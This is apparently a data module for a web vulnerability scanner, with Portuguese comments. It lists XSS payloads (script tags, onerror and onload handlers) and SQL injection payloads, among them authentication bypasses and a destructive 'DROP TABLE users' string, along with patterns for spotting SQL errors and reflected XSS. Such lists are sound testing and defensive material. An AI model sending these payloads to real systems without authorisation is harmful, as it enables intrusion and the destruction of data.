"""
Arquivo contendo payloads e padrões para detecção de vulnerabilidades
"""

XSS_PAYLOADS = [
    '<script>alert("xss")</script>',
    '"><script>alert("xss")</script>',
    '<img src=x onerror=alert("xss")>',
    '\';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//"',
    '"><img src="x" onerror="alert(\'XSS\')">',
    '<svg/onload=alert("xss")>',
    '<body onload=alert("xss")>',
    '<marquee onstart=alert("xss")>',
    '"><<script>alert("xss");//<</script>',
    '"onclick=alert("xss")>'
]

SQLI_PAYLOADS = [
    "'",
    "' OR '1'='1",
    "' OR 1=1--",
    "' UNION SELECT NULL--",
    "admin' --",
    "admin' #",
    "' OR 'x'='x",
    "'); DROP TABLE users--",
    "1'; SELECT * FROM users WHERE 't' = 't",
    "1' OR '1' = '1",
    "' OR '' = '",
    "' OR 1 = 1 LIMIT 1--",
    "1' ORDER BY 1--",
]

# Padrões para detecção de erros SQL
SQL_ERROR_PATTERNS = [
    'sql',
    'mysql',
    'oracle',
    'sqlite',
    'postgresql',
    'Microsoft SQL Server',
    'ORA-01756',
    'Error Executing Database Query',
    'SQLServer JDBC Driver',
    'JDBC_CFM',
    'ODBC Driver',
    'Error Occurred While Processing Request',
    'Server Error in',
    'OLE DB Provider for SQL Server',
    'Unclosed quotation mark',
    '[SQLServer]',
    '[MySQL]',
    '[ODBC]',
    'Syntax error',
    'mysqli_fetch',
    'pg_query',
]

# Padrões para confirmar XSS
XSS_PATTERNS = [
    '<script>',
    'onerror=',
    'onload=',
    'onclick=',
    'onmouseover=',
    'alert(',
    'String.fromCharCode',
    'eval(',
    'fromCharCode',
    'javascript:',
]